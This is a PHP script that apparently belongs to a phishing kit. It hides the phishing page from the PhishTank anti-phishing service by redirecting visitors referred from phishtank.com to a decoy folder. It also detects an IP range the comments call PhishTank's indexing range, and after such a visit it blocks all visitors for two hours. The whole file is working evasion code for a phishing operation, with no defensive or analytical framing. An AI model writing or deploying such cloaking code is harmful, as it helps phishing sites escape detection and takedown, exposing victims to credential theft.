<?php

# Check if the requester is authorized to request this resource directly

if(!defined('authorized')) {

   header('Location: .');
   die();
   
}

# Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website

if(isset($_SERVER['HTTP_REFERER'])) {

 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
 
    header("Location: content/");
    die();
	
}

}


if(isset($_SERVER['HTTP_REFERER'])) {

 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
 
    header("Location: content/");
    die();
	
}

}

# Disallow page access to all visitors for 2 hours if a visit from the Phishtank indexing IP range is detected, then automatically allow it again

$current_time = time();
$recorded_time = recordedTime();
$time_difference = $current_time - $recorded_time;
$timestamp_state = timestampState($recorded_time);
$threshold = "7200";

function recordedTime() {

$db_file = 'logs/db_file.txt';
$handle_check = fopen($db_file, "r");
$contents_check = fread($handle_check, filesize($db_file));
fclose($handle_check);
return $contents_check;

}

function timestampState($recorded_time) {

    if(is_numeric($recorded_time)) {
	
        return true;
		
    }
	
	else return false;
	
}

if ($timestamp_state == 'true') {

 if ($time_difference > $threshold) {
 
 $fh = fopen('logs/db_file.txt', 'r+');
 ftruncate($fh, 0);
 fclose($fh);
 
 $fh_else = fopen("logs/db_file.txt", "a");
 fputs($fh_else, "blank");
 fclose($fh_else);
 
}

 else {
  
   header("Location: content/");
   die();
   
 }
 
}

$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip          = ip2long($_SERVER['REMOTE_ADDR']);

if ($ip >= $range_start && $ip <= $range_end) {
   
   $fh = fopen('logs/db_file.txt', 'r+');
   ftruncate($fh, 0);
   fclose($fh);
   
   $fh_else = fopen("logs/db_file.txt", "a");
   fputs($fh_else, "$current_time");
   fclose($fh_else);
   
   header("Location: content/");
   die();
   
}

?>